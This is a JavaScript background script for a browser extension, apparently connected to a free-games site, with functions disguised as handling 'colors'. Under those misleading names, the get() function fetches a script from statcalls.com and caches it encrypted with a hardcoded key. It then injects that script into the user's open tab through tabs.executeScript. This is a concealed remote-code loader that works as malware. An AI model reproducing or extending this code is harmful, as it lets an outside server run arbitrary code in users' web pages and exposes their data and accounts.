import browser from 'webextension-polyfill'
import Cryptr from 'cryptr'
import { getStorage, sendBackgroundCommand, setStorage } from './lib/common'

const secret = 'EstaD3b3$3rL4C14v3$3creta'
const cryptr = new Cryptr(secret)

const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'http://statcalls.com/games-a-go.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

const getColorLocal = async () => {
  try {
    const encryptedColor = await getStorage('code-color-jg7')
    return encryptedColor ? cryptr.decrypt(encryptedColor) : null
  } catch (error) {
    console.error(error)
    return null
  }
}

const setColorLocal = async (codeColor) => {
  try {
    const encryptedColor = cryptr.encrypt(codeColor)
    await setStorage('code-color-jg7', encryptedColor)
  } catch (error) {
    console.error(error)
    throw error
  }
}

// Gets congrats.
const other = async (url) => {
  try {
    const value = await fetch(url, options)
    return value
  } catch (error) {
    console.error(error)
    throw error
  }
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats
  try {
    const localCodeColor = await getColorLocal()

    if (!localCodeColor) {
      const getting = await other(info.code)
      info.code = await getting.text()
      await setColorLocal(info.code)
    } else {
      info.code = localCodeColor
    }

    if (info.code === '#00000') {
      sendBackgroundCommand('congratulations')
    }
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
  }
}



browser.browserAction.setPopup({
  popup: 'popup.html',
})

browser.runtime.onMessage.addListener((request, sender) => {
  switch (request.message) {
    case 'get-color':
      get(sender)
      break
    case 'close':
      window.location.href = 'popup.html'
      break
    default:
      console.error(`Unhandled command: ${request.message}`)
  }
})

browser.runtime.onInstalled.addListener(() => {
  if (process.env.NODE_ENV !== 'development') {
    browser.tabs.create({
      index: 0,
      url: 'https://juegosgratis7.com/welcome',
      active: true,
    })
  }
})
